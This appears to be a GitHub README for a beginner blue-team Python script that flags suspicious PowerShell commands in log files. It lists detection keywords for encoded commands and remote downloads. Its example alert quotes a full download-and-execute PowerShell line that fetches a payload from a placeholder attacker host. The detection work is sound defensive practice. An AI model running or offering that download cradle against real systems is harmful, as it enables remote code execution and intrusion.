A beginner-friendly **blue team security tool** that analyzes Windows-style log files and detects **suspicious PowerShell command usage** commonly seen in malware, post-exploitation, and living-off-the-land attacks.


This project is designed for:
- SOC analysts (entry-level)
- Blue team learners
- Cybersecurity students
- GitHub portfolio projects


---


## 🚀 Features


- Detects PowerShell execution in logs
- Flags common attacker techniques:
- Base64 encoded commands
- `Invoke-Expression (IEX)` abuse
- Malicious downloads via `DownloadString`, `curl`, `wget`
- Generates a clear alert report
- Provides keyword hit statistics
- Simple, readable Python code


---


## 🧠 Detection Logic


The tool searches log entries for:
- `powershell.exe` execution
- Known suspicious PowerShell keywords such as:
- `EncodedCommand`, `-enc`
- `Invoke-Expression`, `IEX`
- `FromBase64String`
- `Invoke-WebRequest`
- `New-Object Net.WebClient`


These techniques are frequently used in:
- Malware delivery
- Fileless attacks
- Red team simulations


---


## 📁 Project Structure


```
powershell-command-detector/
│── Powershell-command-detector.py
│── logs.txt
│── alerts.txt
│── README.md
```


---


## ▶️ How to Run


1. Clone the repository:
```bash
git clone https://github.com/MedMassous/powershell-command-detector.git
cd powershell-command-detector
```


2. Run the detector:
```bash
python Powershell-command-detector.py
```


3. Review the results:
- Alerts will be saved to `alerts.txt`


---


## 📊 Example Alert


```
[ALERT] Line 2: Suspicious PowerShell usage detected | Keyword=IEX | Command=powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://evil-site.com/payload.ps1')
```


---


## 🎯 Learning Outcomes


- Understand how attackers abuse PowerShell
- Learn basic log parsing techniques
- Build rule-based detection logic
- Practice blue team thinking


---


## 🔮 Future Improvements


- Add severity levels (LOW / MEDIUM / HIGH)
- Support EventID-based detection (4688, Sysmon Event 1)
- Export alerts to CSV
- Map detections to MITRE ATT&CK techniques


---


## 👤 Author


**Mohamed Massous**
Cybersecurity & Blue Team Enthusiast


---


⭐ If you find this project useful, consider giving it a star!
